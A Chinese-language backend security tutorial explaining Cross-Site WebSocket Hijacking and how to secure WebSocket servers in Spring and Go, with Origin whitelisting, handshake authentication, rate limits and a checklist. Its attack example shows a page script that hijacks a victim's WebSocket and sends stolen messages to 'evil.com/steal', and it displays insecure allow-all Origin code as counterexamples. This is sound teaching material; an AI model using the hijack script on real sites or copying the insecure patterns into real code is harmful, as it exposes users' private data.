---
title: "Day 45 — WebSocket 安全：Cross-Site WebSocket Hijacking 與長連線授權"
date: 2026-06-10
tags: ["WebSocket", "API 安全", "認證"]
---

# Day 45 — WebSocket 安全：Cross-Site WebSocket Hijacking 與長連線授權

> 適合對象：後端工程師（初學～中階）
> 主題：WebSocket 連線的 Origin 驗證、認證、訊息層授權，以及 Java（Spring）/ Go（gorilla/websocket）的正確寫法
> 預估閱讀時間：18 分鐘

---

## 一、為什麼今天要講這個？

WebSocket 已經是現代後端的標配：聊天室、即時通知、線上協作、股票報價、遊戲伺服器、AI 串流回覆。但因為大多數人是從 HTTP API 的思維去設計 WebSocket，常常有兩個盲點：

1. **以為瀏覽器的 same-origin policy 也擋得住 WebSocket** —— 錯，WebSocket 預設**不受 CORS 規範管轄**。
2. **以為只要在 handshake（HTTP Upgrade）時驗證一次身份就夠了** —— 錯，連線開起來之後，攻擊者送什麼訊息進來，後端有沒有檢查？

這篇要講的不是「WebSocket 怎麼用」，而是後端在實作 WebSocket server 時最常踩雷的三個地方：**Origin 驗證、認證綁定、訊息層授權**。

跟前面的主題比較：

- 跟 Day 3 CSRF 的關係：**CSWSH（Cross-Site WebSocket Hijacking）就是 WebSocket 版的 CSRF**，但因為 WebSocket 沒有 SameSite Cookie 自動防護機制（瀏覽器仍會帶 cookie），更危險。
- 跟 Day 17 Rate Limiting 的關係：HTTP 你大概在 nginx / API Gateway 就擋掉了；WebSocket 是長連線，連上之後一秒灌一萬則訊息也不會經過 nginx 的 rate limit。

---

## 二、漏洞一：Cross-Site WebSocket Hijacking（CSWSH）

### 攻擊情境

假設你的服務 `https://chat.example.com` 有一個 WebSocket endpoint：

```
wss://chat.example.com/ws
```

使用者已登入，瀏覽器持有 `session=abc123` 的 cookie。

攻擊者架了一個惡意網站 `https://evil.com`，誘騙使用者點進去。網站裡有這段 JavaScript：

```javascript
const ws = new WebSocket("wss://chat.example.com/ws");
ws.onmessage = (e) => {
  // 偷到的訊息送回攻擊者伺服器
  fetch("https://evil.com/steal", { method: "POST", body: e.data });
};
ws.onopen = () => {
  ws.send(JSON.stringify({ action: "list_private_messages" }));
};
```

**關鍵點**：瀏覽器在發起 WebSocket handshake 時，**會自動帶上 `chat.example.com` 的 cookie**。如果你的後端只看 cookie 來認證、不檢查 Origin，那這條從 evil.com 來的連線就是「以受害者身份開啟的合法連線」。

跟 CSRF 不同的是，WebSocket 是**雙向通道**——攻擊者不只能發指令，還能讀到所有後端推送下來的訊息。

### 為什麼瀏覽器擋不住？

- **CORS 不適用於 WebSocket**：fetch / XHR 跨域時瀏覽器會送 preflight、會擋 response，WebSocket 完全沒這套機制。
- **SameSite Cookie 有幫助但不夠**：SameSite=Lax 預設可擋掉大多數 CSRF，但歷史上不同版本瀏覽器對 WebSocket handshake 的 SameSite 處理不一致，**不能當作唯一防線**。
- **瀏覽器只會在 handshake 加上 `Origin` header**——這顆球是丟給後端接的。

### 防禦：後端強制檢查 Origin

WebSocket handshake 是一個 HTTP 請求，瀏覽器一定會帶 `Origin: https://evil.com`。**後端必須白名單檢查這個 header**，不在名單上就直接拒絕 upgrade（回 403）。

⚠️ 注意：`Origin` 只有從瀏覽器發起時可信。如果是後端對後端（沒有瀏覽器），對方可以任意偽造 `Origin`，所以對「公開的 WebSocket API」，Origin 只是防瀏覽器 CSWSH，不是萬能驗證。對非瀏覽器的 client，要靠 token / API key。

---

## 三、Java（Spring Boot）正確寫法

Spring 提供兩種主流方式：原生 `@ServerEndpoint` 和 Spring WebSocket。這裡示範後者（更常用）。

### ❌ 危險寫法：什麼都沒驗證

```java
@Configuration
@EnableWebSocket
public class WsConfig implements WebSocketConfigurer {
    @Override
    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
        registry.addHandler(new ChatHandler(), "/ws")
                .setAllowedOrigins("*");  // ← 等於沒檢查
    }
}
```

`setAllowedOrigins("*")` 意思是「任何網站開的 WebSocket 我都收」，等同於對 CSWSH 完全敞開。

### ✅ 正確寫法：白名單 + handshake 攔截

```java
@Configuration
@EnableWebSocket
public class WsConfig implements WebSocketConfigurer {

    @Override
    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
        registry.addHandler(chatHandler(), "/ws")
                // 只信任這幾個 Origin，不要用 "*"
                .setAllowedOrigins(
                        "https://chat.example.com",
                        "https://www.example.com"
                )
                .addInterceptors(new AuthHandshakeInterceptor());
    }

    @Bean
    public WebSocketHandler chatHandler() {
        return new ChatHandler();
    }
}
```

```java
// Handshake 階段把使用者身份綁到 WebSocketSession 屬性裡
public class AuthHandshakeInterceptor implements HandshakeInterceptor {

    @Override
    public boolean beforeHandshake(ServerHttpRequest request,
                                   ServerHttpResponse response,
                                   WebSocketHandler wsHandler,
                                   Map<String, Object> attributes) {
        // 從 cookie 或 Authorization header 拿到 token 後驗證
        String token = extractToken(request);
        UserPrincipal user = authService.verify(token);
        if (user == null) {
            response.setStatusCode(HttpStatus.UNAUTHORIZED);
            return false;  // 拒絕 upgrade
        }
        attributes.put("user", user);  // 後續每則訊息都拿得到
        return true;
    }

    @Override
    public void afterHandshake(ServerHttpRequest req, ServerHttpResponse resp,
                               WebSocketHandler h, Exception ex) {}

    private String extractToken(ServerHttpRequest request) { /* ... */ return null; }
}
```

> 為什麼把 user 放進 `attributes`？因為 WebSocket 連線一旦建立，後續訊息**不會再經過 HTTP filter**，你拿不到 SecurityContext。必須在 handshake 把身份「黏」到 session 上，後面每則訊息都從 session 拿。

### ✅ 訊息層授權：別只信任 client 給的 userId

```java
public class ChatHandler extends TextWebSocketHandler {

    @Override
    protected void handleTextMessage(WebSocketSession session, TextMessage msg) throws Exception {
        UserPrincipal me = (UserPrincipal) session.getAttributes().get("user");
        ChatCommand cmd = mapper.readValue(msg.getPayload(), ChatCommand.class);

        // ❌ 不要這樣：相信 client 自報的 senderId
        // chatService.send(cmd.senderId, cmd.roomId, cmd.content);

        // ✅ 用 handshake 綁定的身份，並檢查 room 權限
        if (!roomService.canPost(me.getId(), cmd.roomId)) {
            session.sendMessage(new TextMessage("{\"error\":\"forbidden\"}"));
            return;
        }
        chatService.send(me.getId(), cmd.roomId, cmd.content);
    }
}
```

這就是 WebSocket 版的 IDOR / BOLA（Day 7、Day 25）。長連線會讓人鬆懈，覺得「都連上了應該沒問題」——但每一則訊息都是一次新的授權決策。

---

## 四、Go（gorilla/websocket）正確寫法

Go 後端最常用 [gorilla/websocket](https://github.com/gorilla/websocket)。它的 `Upgrader` 預設 `CheckOrigin` 是 `nil`，**這時行為是只接受同源**。但網路上很多範例直接寫成 `return true` 把它打開，這就是漏洞起點。

### ❌ 危險寫法

```go
var upgrader = websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool { return true },  // ← 接受所有 Origin
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
    conn, _ := upgrader.Upgrade(w, r, nil)
    defer conn.Close()
    for {
        _, msg, err := conn.ReadMessage()
        if err != nil { return }
        // 完全沒驗證身份就處理訊息
        handleMessage(msg)
    }
}
```

### ✅ 正確寫法

```go
var allowedOrigins = map[string]bool{
    "https://chat.example.com": true,
    "https://www.example.com":  true,
}

var upgrader = websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool {
        origin := r.Header.Get("Origin")
        return allowedOrigins[origin]  // 白名單比對
    },
    ReadBufferSize:  4096,
    WriteBufferSize: 4096,
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
    // 1. Handshake 階段先驗證身份（HTTP cookie / Authorization）
    user, err := auth.VerifyFromRequest(r)
    if err != nil {
        http.Error(w, "unauthorized", http.StatusUnauthorized)
        return
    }

    // 2. Upgrade（CheckOrigin 已經把 CSWSH 擋掉）
    conn, err := upgrader.Upgrade(w, r, nil)
    if err != nil { return }
    defer conn.Close()

    // 3. 設定讀取限制：防止單一連線吃光記憶體
    conn.SetReadLimit(64 * 1024)                    // 單則訊息上限 64KB
    conn.SetReadDeadline(time.Now().Add(60 * time.Second))
    conn.SetPongHandler(func(string) error {
        conn.SetReadDeadline(time.Now().Add(60 * time.Second))
        return nil
    })

    // 4. 簡單的 per-connection rate limit
    limiter := rate.NewLimiter(rate.Limit(10), 20)  // 平均 10 msg/s，bucket 20

    for {
        _, msg, err := conn.ReadMessage()
        if err != nil { return }

        if !limiter.Allow() {
            conn.WriteMessage(websocket.TextMessage, []byte(`{"error":"rate_limited"}`))
            continue
        }

        // 5. 訊息層用 handshake 綁定的 user，不信任 payload 內的 userId
        if err := handleMessage(user, msg); err != nil {
            log.Printf("user=%s msg err: %v", user.ID, err)
        }
    }
}
```

幾個重點：

- **`CheckOrigin` 一定要寫**，不能 `return true`。
- **`SetReadLimit`** 防止對方送 100MB 的單一 frame 把記憶體吃爆。
- **Read deadline + Ping/Pong** 是 WebSocket 的「自我清理」機制——半開連線（half-open，例如對方斷網沒關 socket）若不清掉會慢慢累積成資源洩漏。
- **每連線 rate limit**：HTTP 的 rate limit 是「每 IP 每秒 N 個請求」，WebSocket 要改成「每連線每秒 N 則訊息」。

---

## 五、其他常見地雷

### 5.1 Token 放 URL query string

很多人為了方便這樣寫：

```javascript
new WebSocket("wss://api.example.com/ws?token=eyJhbGc...")
```

問題：**URL 會被寫進伺服器 access log、proxy log、瀏覽器歷史**。Day 15「Secrets Management」講過這類洩漏。

**正確做法**：

- 短命 token（例如先呼叫 `POST /ws-ticket` 換一張 30 秒內有效、只能用一次的 ticket，再用 ticket 當 query string）。
- 或用瀏覽器自動帶的 cookie + handshake 驗證。
- 或用 [WebSocket subprotocols](https://datatracker.ietf.org/doc/html/rfc6455#section-1.9) 帶 token（`Sec-WebSocket-Protocol` header，不會進 URL log）。

### 5.2 認證 token 過期後不主動斷線

WebSocket 是長連線，client 連上之後可能掛兩天。如果你的 access token 是 15 分鐘有效，**過期後後端要主動斷線**，否則等於把 session 的有效期延長到「連線斷掉為止」。

實作建議：handshake 時記下 token 的 `exp`，背景 goroutine / scheduled task 到期就 close 連線，要求對方拿 refresh token 重新連。

### 5.3 廣播時沒檢查接收者權限

聊天室常見錯誤：

```go
// ❌ 把訊息廣播給「所有連線中的 user」
for _, conn := range allConnections {
    conn.WriteJSON(message)
}
```

如果這是「Room A 的訊息」，但 `allConnections` 裡有不在 Room A 的人——資料外洩。**廣播前一定要過濾接收者**。

### 5.4 訊息內容沒做輸入驗證

WebSocket 訊息一樣會進資料庫、進 log、進前端 DOM。SQL Injection（Day 1）、XSS（Day 2）、Command Injection（Day 12）、SSTI（Day 21）所有規則都還在。**別因為「這是 WebSocket 不是 HTTP API」就跳過 validation**。

---

## 六、檢查清單

連線層（Handshake 階段）：

- `Origin` header 用白名單比對，絕對不要 `*` 或 `return true`
- 用 cookie / token 完成認證後才 upgrade，沒過就 401
- Token 不要放 URL query string；用 ticket 或 subprotocol

連線層（連線屬性）：

- `SetReadLimit`（Go）/ `setMaxBinaryMessageBufferSize`（Java）限制單則訊息大小
- 設定 idle timeout + Ping/Pong 清掉半開連線
- 限制單一 user 最多開幾條 WebSocket（防 connection flood）

訊息層：

- 使用者身份從 handshake 綁定的 session 拿，不從 message payload 拿
- 每則 action 都做授權檢查（房間、資源、角色）
- Per-connection rate limit（不只 per-IP）
- 廣播訊息前過濾接收者
- payload 內容做輸入驗證

維運層：

- Access token 過期主動斷線
- 紀錄 handshake 失敗的 Origin / IP（Day 16）
- 用 TLS（`wss://` 不是 `ws://`）

---

## 七、一句話總結

> **WebSocket 不是 HTTP，但每一則訊息都該被當成一次新的 HTTP 請求來驗證。Handshake 只是入場券，授權是每則訊息的事。**

明天會講 **HTTP Host Header Attack（Host 標頭注入）**——當後端信任請求帶進來的 `Host` header 去組密碼重設連結、快取 key 或絕對網址時，攻擊者改一個 header 就能把重設連結指向自己的網域、或污染快取。這跟 Day 30 的 Web Cache Poisoning、Day 38 的代理標頭信任互相呼應。
